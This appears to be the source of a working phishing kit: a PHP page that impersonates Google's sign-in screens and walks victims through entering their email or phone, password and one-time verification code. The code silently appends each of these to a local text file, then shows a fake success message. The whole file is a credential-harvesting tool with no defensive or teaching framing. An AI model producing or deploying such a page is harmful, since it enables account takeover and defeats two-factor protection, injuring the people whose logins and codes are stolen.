<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in – Google Accounts</title>
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/logo_2x.png">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      background: #fff;
      color: #202124;
    }
    a{
    text-decoration: none;
    }
    .container {
      max-width: 400px;
      margin: 60px auto;
      padding: 24px;
    }
    .logo {
      width: 50px;
      padding-bottom: 10px;
      margin: 16px;
      margin-left: 1px;
      display: block;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 8px;
    }
    p.subtitle {
      color: #000000;
      font-size: 16px;
      margin: 30px;
      margin-left: 1px;
    }
    .input-container {
      position: relative;
      margin-bottom: 10px;
    }
    input[type="text"], input[type="password"] {
      width: 85%;
      padding: 14px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      padding-right: 40px;
    }
    .clear-btn {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #70757a;
      cursor: pointer;
      font-size: 18px;
      display: none;
    }
    input:not(:placeholder-shown) + .clear-btn {
      display: block;
    }
    .btn-row {
      display: flex;
      justify-content: space-between;
      margin-top: 30px;
    }
    .btn {
      margin-top: 80px;
      padding: 10px 22px;
      font-size: 14px;
      font-weight: 500;
      border-radius: 4px;
      border: none;
      cursor: pointer;
    }
    .btn.next {
      background: #1a73e8;
      color: #fff;
    }
    .btn.back {
      background: transparent;
      color: #1a73e8;
    }
    .link {
      color: #1a73e8;
      font-size: 14px;
      text-decoration: none;
      display: block;
      margin-top: 20px;
    }
    .footer {
      text-align: center;
      margin-top: 140px;
      color: #5f6368;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
      if (isset($_POST['email']) && !isset($_POST['password'])) {
        $email = trim($_POST['email']);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL) && !preg_match('/^[0-9]{10,15}$/', $email)) {
          echo "<script>alert('Enter valid email or phone number');history.back();</script>";
          exit();
        }
        file_put_contents("recovery_data.txt", "Email/Phone: $email\n", FILE_APPEND);
        echo '
        <img src="Google.png" class="logo">
        <h1>Welcome</h1>
        <p class="subtitle">Hi  <b>'.htmlspecialchars($email).'</b></p>
        <form method="POST">
          <input type="hidden" name="email" value="'.htmlspecialchars($email).'">
          <div class="input-container">
            <input type="password" name="password" placeholder="Enter your password" required />
            <button type="button" class="clear-btn" onclick="this.previousElementSibling.value=\'\'; this.previousElementSibling.focus()">×</button>
          </div>
          <div class="btn-row">
            <button type="button" class="btn back" onclick="history.back()">Forgot Password</button>
            <button type="submit" class="btn next">Next</button>
          </div>
        </form>';
      }
      elseif (isset($_POST['password']) && isset($_POST['email']) && !isset($_POST['code'])) {
        $email = $_POST['email'];
        $password = $_POST['password'];
        file_put_contents("recovery_data.txt", "Password: $password\n", FILE_APPEND);

        // OTP Code
        echo '
        <img src="Google.png" class="logo">
        <h1>Verify it\'s you</h1>
        <p class="subtitle">Code sent to: +91 *********</p>
        <form method="POST">
          <input type="hidden" name="email" value="'.htmlspecialchars($email).'">
          <input type="hidden" name="password" value="'.htmlspecialchars($password).'">
          <div class="input-container">
            <input type="text" name="code" placeholder="6-digit code" required pattern="\d{6}">
            <button type="button" class="clear-btn" onclick="this.previousElementSibling.value=\'\'; this.previousElementSibling.focus()">×</button>
          </div>
          <div class="btn-row">
            <button type="button" class="btn back" onclick="history.back()">Try Again</button>
            <button type="submit" class="btn next">Verify</button>
          </div>
        </form>';
      }
      elseif (isset($_POST['code'])) {
        $email = $_POST['email'];
        $password = $_POST['password'];
        $code = $_POST['code'];
        file_put_contents("recovery_data.txt", "Entered OTP Code: $code\n\n", FILE_APPEND);
        echo '
        <img src="Google.png" class="logo">
        <h1>Success</h1>
        <p class="subtitle">Account verified for: <b>'.htmlspecialchars($email).'</b></p>
        <p style="text-align:center;"><a class="link" href="#">Go to account</a></p>';
      }
    } else {
      echo '
      <img src="Google.png" class="logo">
      <h1>Sign in</h1>
      <p class="subtitle">Use your Google Account</p>
      <form method="POST">
        <div class="input-container">
          <input type="text" name="email" placeholder="Email or phone" required>
          <button type="button" class="clear-btn" onclick="this.previousElementSibling.value=\'\'; this.previousElementSibling.focus()">×</button>
        </div>
        <a class="link" href="#">Forgot email?</a>
        <div class="btn-row">
          <a class="btn back" href="#">Create account</a>
          <button type="submit" class="btn next">Next</button>
        </div>
      </form>';
    }
    ?>
  </div>
  <div class="footer">
    English (United States) • Help • Privacy • Terms
  </div>
</body>
</html>